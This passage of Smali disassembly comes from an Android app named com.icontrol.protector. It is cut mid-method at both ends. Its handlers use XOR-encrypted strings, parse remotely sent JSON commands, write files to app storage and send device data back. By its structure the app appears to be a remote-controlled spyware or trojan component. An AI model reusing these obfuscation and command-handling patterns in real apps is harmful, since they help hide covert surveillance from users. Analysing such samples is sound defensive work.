    invoke-direct {v9}, Ljava/util/ArrayList;-><init>()V

    invoke-interface {v8, v3, v9}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v8, v1, Lcom/icontrol/protector/LiveChat$a;->b:Ljava/util/Map;

    invoke-static {v12, v13}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v9

    invoke-interface {v8, v3, v9}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_0

    :catch_0
    move-exception v0

    goto/16 :goto_1

    :cond_0
    :goto_0
    iget-object v8, v1, Lcom/icontrol/protector/LiveChat$a;->a:Ljava/util/Map;

    invoke-interface {v8, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/util/List;

    invoke-interface {v8, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    iget-object v8, v1, Lcom/icontrol/protector/LiveChat$a;->b:Ljava/util/Map;

    invoke-interface {v8, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Ljava/lang/Long;

    invoke-virtual {v9}, Ljava/lang/Long;->longValue()J

    move-result-wide v11

    array-length v0, v0

    move-object v13, v3

    int-to-long v2, v0

    add-long/2addr v11, v2

    invoke-static {v11, v12}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    invoke-interface {v8, v13, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$a;->b:Ljava/util/Map;

    invoke-interface {v0, v13}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Long;

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v2

    cmp-long v0, v2, v14

    if-ltz v0, :cond_4

    new-array v0, v7, [B

    const/16 v2, -0x1a

    aput-byte v2, v0, v10

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_16

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    const/4 v2, 0x4

    if-eqz v0, :cond_2

    new-instance v0, Ljava/io/File;

    iget-object v3, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v3

    const/16 v5, 0x9

    new-array v8, v5, [B

    fill-array-data v8, :array_17

    const/16 v5, 0x8

    new-array v11, v5, [B

    fill-array-data v11, :array_18

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v0, v3, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_1

    invoke-virtual {v0}, Ljava/io/File;->mkdirs()Z

    :cond_1
    new-instance v3, Ljava/io/File;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v8, v2, [B

    fill-array-data v8, :array_19

    const/16 v9, 0x8

    new-array v11, v9, [B

    fill-array-data v11, :array_1a

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v0, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v5

    sget-object v0, Lcom/icontrol/protector/a;->d:Ljava/util/ArrayList;

    invoke-virtual {v0, v4}, Ljava/util/ArrayList;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Lcom/icontrol/protector/a;->d:Ljava/util/ArrayList;

    invoke-virtual {v0, v4}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_2
    invoke-direct {v1, v5, v13}, Lcom/icontrol/protector/LiveChat$a;->y(Ljava/lang/String;Ljava/lang/String;)V

    new-array v0, v7, [B

    const/16 v3, 0x5d

    aput-byte v3, v0, v10

    const/16 v3, 0x8

    new-array v5, v3, [B

    fill-array-data v5, :array_1b

    invoke-static {v0, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    new-instance v0, Ljava/io/File;

    iget-object v3, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v3

    const/16 v5, 0x9

    new-array v5, v5, [B

    fill-array-data v5, :array_1c

    const/16 v6, 0x8

    new-array v7, v6, [B

    fill-array-data v7, :array_1d

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v0, v3, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    new-instance v3, Ljava/io/File;

    invoke-direct {v3, v0, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/io/File;->exists()Z

    move-result v5

    if-nez v5, :cond_3

    invoke-virtual {v3}, Ljava/io/File;->mkdirs()Z

    :cond_3
    new-instance v5, Ljava/io/File;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v2, v2, [B

    fill-array-data v2, :array_1e

    const/16 v4, 0x8

    new-array v7, v4, [B

    fill-array-data v7, :array_1f

    invoke-static {v2, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v5, v0, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v1, v5, v3}, Lcom/icontrol/protector/LiveChat$a;->v(Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :goto_1
    const/16 v2, 0xc

    new-array v2, v2, [B

    fill-array-data v2, :array_20

    const/16 v3, 0x8

    new-array v3, v3, [B

    fill-array-data v3, :array_21

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :cond_4
    :goto_2
    return-void

    nop

    :array_0
    .array-data 1
        0x39t
        0x4t
        -0x1bt
        0x40t
        -0x2ct
        -0x33t
        0x41t
        0x43t
    .end array-data

    :array_1
    .array-data 1
        0x5ft
        0x6dt
        -0x77t
        0x25t
        -0x44t
        -0x54t
        0x32t
        0x2bt
    .end array-data

    :array_2
    .array-data 1
        0x33t
        -0x6dt
        0x65t
        -0x42t
        0x47t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x56t
        -0x2t
        0x15t
        -0x36t
        0x3et
        -0x49t
        0x1ct
        -0x34t
    .end array-data

    :array_4
    .array-data 1
        0x25t
        -0x67t
        0x6t
        0xat
        -0x3t
        0x7et
        0x61t
        -0x28t
    .end array-data

    :array_5
    .array-data 1
        0x56t
        -0x8t
        0x70t
        0x6ft
        -0x73t
        0x1ft
        0x15t
        -0x50t
    .end array-data

    :array_6
    .array-data 1
        -0x4at
        0x52t
        -0x4et
        0x6bt
        0x61t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x2dt
        0x3ft
        -0x3et
        0x1ft
        0x18t
        0x6ct
        -0x3at
        0x8t
    .end array-data

    :array_8
    .array-data 1
        0x5at
        0x48t
        0x3t
        -0x29t
        -0xbt
        -0xbt
        -0x30t
    .end array-data

    :array_9
    .array-data 1
        0x33t
        0x3bt
        0x6at
        -0x47t
        -0x61t
        -0x6at
        -0x5ct
        0x8t
    .end array-data

    :array_a
    .array-data 1
        0x1ct
        -0x80t
        0x6t
        -0x25t
        -0x60t
        -0x2t
        -0x5at
        0x2dt
    .end array-data

    :array_b
    .array-data 1
        0x1ft
        0x40t
        0x5ft
        0x34t
        0x34t
    .end array-data

    nop

    :array_c
    .array-data 1
        0x75t
        0x23t
        0x2bt
        0x5dt
        0x50t
        0x16t
        0x53t
        0x27t
    .end array-data

    :array_d
    .array-data 1
        -0x1ft
        0x54t
        -0x2ct
        0x1dt
        0x41t
        0xdt
        -0x5t
        0x20t
    .end array-data

    :array_e
    .array-data 1
        -0x27t
        -0x21t
        -0x7t
        -0x8t
        0x14t
        0x6at
        0x2at
        -0x68t
    .end array-data

    :array_f
    .array-data 1
        -0x41t
        -0x4at
        -0x6bt
        -0x63t
        0x70t
        0xbt
        0x5et
        -0x7t
    .end array-data

    :array_10
    .array-data 1
        0x4t
        -0x25t
        0x71t
        0x37t
        -0x40t
        -0x27t
        -0x23t
        -0x27t
        0x15t
    .end array-data

    nop

    :array_11
    .array-data 1
        0x70t
        -0x4ct
        0x5t
        0x56t
        -0x54t
        -0x76t
        -0x4ct
        -0x5dt
    .end array-data

    :array_12
    .array-data 1
        -0x38t
        -0x8t
        0x30t
        -0x74t
        -0x4t
        -0x44t
        -0x2t
        0x76t
    .end array-data

    :array_13
    .array-data 1
        -0x45t
        -0x63t
        0x5et
        -0x8t
        -0x51t
        -0x2bt
        -0x7ct
        0x13t
    .end array-data

    :array_14
    .array-data 1
        0x1ft
        0x2at
        0x24t
        0x13t
        -0x31t
        0x20t
        -0x47t
        0x0t
        0x1et
        0x27t
        0x23t
    .end array-data

    :array_15
    .array-data 1
        0x7ct
        0x42t
        0x51t
        0x7dt
        -0x5ct
        0x6et
        -0x34t
        0x6dt
    .end array-data

    :array_16
    .array-data 1
        -0x29t
        -0x2bt
        0x67t
        -0x55t
        0x70t
        0x1ft
        0x21t
        -0x75t
    .end array-data

    :array_17
    .array-data 1
        0xdt
        0x44t
        0x43t
        0x7dt
        -0x61t
        0x33t
        0x6ct
        0x27t
        0x19t
    .end array-data

    nop

    :array_18
    .array-data 1
        0x7dt
        0x36t
        0x2ct
        0x9t
        -0x6t
        0x50t
        0x18t
        0x42t
    .end array-data

    :array_19
    .array-data 1
        -0x1dt
        -0x6at
        -0x77t
        -0x6dt
    .end array-data

    :array_1a
    .array-data 1
        -0x33t
        -0x14t
        -0x20t
        -0x1dt
        0x41t
        0x44t
        -0x67t
        -0x3ct
    .end array-data

    :array_1b
    .array-data 1
        0x6ct
        -0x15t
        -0x16t
        0x24t
        0x35t
        -0x1ft
        0x50t
        0xet
    .end array-data

    :array_1c
    .array-data 1
        0x5dt
        0x4et
        0x44t
        0x23t
        0x1bt
        -0x58t
        -0x1bt
        0x8t
        0x49t
    .end array-data

    nop

    :array_1d
    .array-data 1
        0x2dt
        0x3ct
        0x2bt
        0x57t
        0x7et
        -0x35t
        -0x6ft
        0x6dt
    .end array-data

    :array_1e
    .array-data 1
        0x77t
        0xft
        -0x21t
        -0x66t
    .end array-data

    :array_1f
    .array-data 1
        0x59t
        0x75t
        -0x4at
        -0x16t
        0x6dt
        0x77t
        0x70t
        0x42t
    .end array-data

    :array_20
    .array-data 1
        0x3ft
        -0x1at
        0x6ft
        -0x4dt
        0x62t
        0x31t
        -0x80t
        -0x19t
        0x1bt
        -0x18t
        0x60t
        -0x4dt
    .end array-data

    :array_21
    .array-data 1
        0x77t
        -0x79t
        0x1t
        -0x29t
        0xet
        0x54t
        -0x2bt
        -0x69t
    .end array-data
.end method

.method private o(Lorg/json/JSONObject;)V
    .locals 12

    .line 1
    const/4 v0, 0x4

    const/16 v1, 0x8

    :try_start_0
    new-array v2, v0, [B

    fill-array-data v2, :array_0

    new-array v3, v1, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x5

    new-array v4, v3, [B

    fill-array-data v4, :array_2

    new-array v5, v1, [B

    fill-array-data v5, :array_3

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p1, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-array v4, v1, [B

    fill-array-data v4, :array_4

    new-array v5, v1, [B

    fill-array-data v5, :array_5

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v5, v0, [B

    fill-array-data v5, :array_6

    new-array v6, v1, [B

    fill-array-data v6, :array_7

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p1, v4, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const/4 v4, 0x6

    new-array v5, v4, [B

    fill-array-data v5, :array_8

    new-array v6, v1, [B

    fill-array-data v6, :array_9

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v6, v1, [B

    fill-array-data v6, :array_b

    invoke-static {v0, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v5, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    new-array v0, v4, [B

    fill-array-data v0, :array_c

    new-array v5, v1, [B

    fill-array-data v5, :array_d

    invoke-static {v0, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v5, 0x1

    new-array v6, v5, [B

    const/16 v9, -0x1b

    const/4 v10, 0x0

    aput-byte v9, v6, v10

    new-array v9, v1, [B

    fill-array-data v9, :array_e

    invoke-static {v6, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {p1, v0, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-array v4, v4, [B

    fill-array-data v4, :array_f

    new-array v6, v1, [B

    fill-array-data v6, :array_10

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v3, v3, [B

    fill-array-data v3, :array_11

    new-array v6, v1, [B

    fill-array-data v6, :array_12

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v4, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v4

    const/16 v6, 0x41

    if-eq v4, v6, :cond_1

    const/16 v6, 0x4e

    if-eq v4, v6, :cond_0

    goto :goto_0

    :cond_0
    new-array v4, v5, [B

    const/16 v6, 0x37

    aput-byte v6, v4, v10

    new-array v6, v1, [B

    fill-array-data v6, :array_13

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    move v2, v10

    goto :goto_1

    :catch_0
    move-exception p1

    goto :goto_2

    :cond_1
    new-array v4, v5, [B

    const/16 v6, -0x75

    aput-byte v6, v4, v10

    new-array v6, v1, [B

    fill-array-data v6, :array_14

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    move v2, v5

    goto :goto_1

    :cond_2
    :goto_0
    const/4 v2, -0x1

    :goto_1
    if-eqz v2, :cond_4

    if-eq v2, v5, :cond_3

    goto :goto_3

    :cond_3
    const/4 v2, 0x3

    new-array v2, v2, [B

    fill-array-data v2, :array_15

    new-array v4, v1, [B

    fill-array-data v4, :array_16

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v5, [B

    const/16 v5, 0x9

    aput-byte v5, v4, v10

    new-array v5, v1, [B

    fill-array-data v5, :array_17

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p1, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    iget-object v6, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Integer;->intValue()I

    move-result v9

    move-object v10, v3

    invoke-static/range {v6 .. v11}, Lcom/icontrol/protector/n;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    :cond_4
    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    invoke-static {p1, v7, v8, v0, v3}, Lcom/icontrol/protector/n;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :goto_2
    const/16 v0, 0xf

    new-array v0, v0, [B

    fill-array-data v0, :array_18

    new-array v1, v1, [B

    fill-array-data v1, :array_19

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :goto_3
    return-void

    nop

    :array_0
    .array-data 1
        0x56t
        0x2bt
        -0x75t
        0x18t
    .end array-data

    :array_1
    .array-data 1
        0x25t
        0x5et
        -0x17t
        0x7bt
        0x34t
        0x55t
        -0x47t
        0x2dt
    .end array-data

    :array_2
    .array-data 1
        0x38t
        -0x21t
        -0x6et
        -0x2t
        0x72t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x5dt
        -0x4et
        -0x1et
        -0x76t
        0xbt
        0x11t
        0x12t
        0x40t
    .end array-data

    :array_4
    .array-data 1
        -0x3at
        -0x7dt
        -0x19t
        -0x32t
        0x57t
        -0x5ft
        -0x80t
        0x79t
    .end array-data

    :array_5
    .array-data 1
        -0x4et
        -0x15t
        -0x7et
        -0x46t
        0x3et
        -0x2bt
        -0x14t
        0x1ct
    .end array-data

    :array_6
    .array-data 1
        -0x4bt
        -0xbt
        0x66t
        0x64t
    .end array-data

    :array_7
    .array-data 1
        -0x25t
        -0x80t
        0xat
        0x8t
        0x4et
        -0x28t
        -0x59t
        -0x34t
    .end array-data

    :array_8
    .array-data 1
        0x44t
        -0x1ft
        -0x2et
        0x25t
        0x64t
        -0x5ft
    .end array-data

    nop

    :array_9
    .array-data 1
        0x30t
        -0x77t
        -0x49t
        0x48t
        0x17t
        -0x3at
        0x25t
        -0x38t
    .end array-data

    :array_a
    .array-data 1
        0x1ct
        -0xct
        -0x3ct
        0x1ct
    .end array-data

    :array_b
    .array-data 1
        0x72t
        -0x7ft
        -0x58t
        0x70t
        0x2dt
        0x68t
        0x15t
        -0x68t
    .end array-data

    :array_c
    .array-data 1
        0xbt
        -0x3dt
        -0x7et
        -0x6et
        -0x14t
        0x6ct
    .end array-data

    nop

    :array_d
    .array-data 1
        0x7ft
        -0x55t
        -0x19t
        -0x15t
        -0x64t
        0x9t
        -0x52t
        0x7t
    .end array-data

    :array_e
    .array-data 1
        -0x2bt
        -0x71t
        0x5bt
        0x5bt
        -0x20t
        0x3at
        0x62t
        0x42t
    .end array-data

    :array_f
    .array-data 1
        -0x2et
        -0x71t
        -0x7at
        0x24t
        -0x5et
        0x2bt
    .end array-data

    nop

    :array_10
    .array-data 1
        -0x5at
        -0x20t
        -0x17t
        0x54t
        -0x39t
        0x45t
        -0x35t
        0x41t
    .end array-data

    :array_11
    .array-data 1
        0x6et
        -0x72t
        -0x69t
        0x5dt
        -0x3dt
    .end array-data

    nop

    :array_12
    .array-data 1
        0xbt
        -0x1dt
        -0x19t
        0x29t
        -0x46t
        0x52t
        0x4ct
        0x39t
    .end array-data

    :array_13
    .array-data 1
        0x79t
        -0x5ft
        -0x3ct
        -0x63t
        0x4at
        -0x21t
        0x52t
        -0x2ct
    .end array-data

    :array_14
    .array-data 1
        -0x36t
        0x1ct
        0x50t
        -0x5ft
        -0x66t
        -0x68t
        0x6ft
        0x79t
    .end array-data

    :array_15
    .array-data 1
        0x4dt
        0x1et
        0x32t
    .end array-data

    :array_16
    .array-data 1
        0x24t
        0x7dt
        0x5dt
        -0x4bt
        -0x19t
        0x49t
        0x66t
        -0x6dt
    .end array-data

    :array_17
    .array-data 1
        0x39t
        0x49t
        0x2ft
        0x6ft
        -0x7t
        0x3at
        -0x32t
        0x62t
    .end array-data

    :array_18
    .array-data 1
        -0x42t
        0x65t
        -0x46t
        0x4dt
        -0x7ct
        0x76t
        0x4at
        0x53t
        -0x67t
        0x65t
        -0x50t
        0x4at
        -0x77t
        0x60t
        0x5ct
    .end array-data

    :array_19
    .array-data 1
        -0xat
        0x4t
        -0x2ct
        0x29t
        -0x18t
        0x13t
        0x28t
        0x21t
    .end array-data
.end method

.method private p(Lorg/json/JSONObject;)V
    .locals 7

    .line 1
    const-string v0, ""

    const/4 v1, 0x3

    const/16 v2, 0x8

    :try_start_0
    new-array v1, v1, [B

    fill-array-data v1, :array_0

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v3, 0x1

    new-array v4, v3, [B

    const/16 v5, -0x3e

    const/4 v6, 0x0

    aput-byte v5, v4, v6

    new-array v5, v2, [B

    fill-array-data v5, :array_2

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    const/4 v5, 0x4

    if-eqz v4, :cond_0

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {p1}, Lcom/icontrol/protector/a;->j(Landroid/content/Context;)V

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {p1}, Lcom/icontrol/protector/n;->X(Landroid/content/Context;)Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    new-array v1, v5, [B

    fill-array-data v1, :array_3

    new-array v3, v2, [B

    fill-array-data v3, :array_4

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v3, v5, [B

    fill-array-data v3, :array_5

    new-array v4, v2, [B

    fill-array-data v4, :array_6

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v1, 0x5

    new-array v1, v1, [B

    fill-array-data v1, :array_7

    new-array v3, v2, [B

    fill-array-data v3, :array_8

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v0, p1}, Lcom/icontrol/protector/LiveChat;->g(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_0
    move-exception p1

    :try_start_2
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_1

    :catch_1
    move-exception p1

    goto :goto_0

    :cond_0
    new-array v3, v3, [B

    const/16 v4, 0x11

    aput-byte v4, v3, v6

    new-array v4, v2, [B

    fill-array-data v4, :array_9

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    new-array v1, v5, [B

    fill-array-data v1, :array_a

    new-array v3, v2, [B

    fill-array-data v3, :array_b

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_1

    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v0, p1}, Lcom/icontrol/protector/n;->Y(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_1

    :goto_0
    const/16 v0, 0xf

    new-array v0, v0, [B

    fill-array-data v0, :array_c

    new-array v1, v2, [B

    fill-array-data v1, :array_d

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :cond_1
    :goto_1
    return-void

    nop

    :array_0
    .array-data 1
        -0x7ct
        0x47t
        0x16t
    .end array-data

    :array_1
    .array-data 1
        -0x19t
        0x26t
        0x65t
        -0x4et
        -0x7at
        0x3et
        -0x62t
        0x6t
    .end array-data

    :array_2
    .array-data 1
        -0xet
        0xdt
        -0x24t
        0x49t
        -0x75t
        -0x7t
        -0x6ct
        -0xdt
    .end array-data

    :array_3
    .array-data 1
        0x65t
        -0x19t
        -0x53t
        0x2dt
    .end array-data

    :array_4
    .array-data 1
        0x11t
        -0x62t
        -0x23t
        0x48t
        -0x2ft
        0x2t
        -0x78t
        0xct
    .end array-data

    :array_5
    .array-data 1
        0x71t
        0x2ft
        -0x2et
        -0x74t
    .end array-data

    :array_6
    .array-data 1
        0x12t
        0x43t
        -0x45t
        -0x4t
        -0x2ct
        -0x7ft
        -0x71t
        -0x2ft
    .end array-data

    :array_7
    .array-data 1
        0x30t
        -0x54t
        0x20t
        0x78t
        0x2at
    .end array-data

    nop

    :array_8
    .array-data 1
        0x53t
        -0x38t
        0x41t
        0xct
        0x4bt
        -0x3dt
        -0x1dt
        -0x11t
    .end array-data

    :array_9
    .array-data 1
        0x20t
        0x60t
        -0x3dt
        -0x39t
        0x6et
        -0x13t
        0x22t
        0x57t
    .end array-data

    :array_a
    .array-data 1
        0x51t
        -0x3bt
        -0x23t
        0xet
    .end array-data

    :array_b
    .array-data 1
        0x25t
        -0x56t
        -0x52t
        0x7at
        -0x28t
        -0x79t
        -0x64t
        -0x80t
    .end array-data

    :array_c
    .array-data 1
        0x2et
        0x27t
        -0x28t
        -0x64t
        -0x5at
        -0x3et
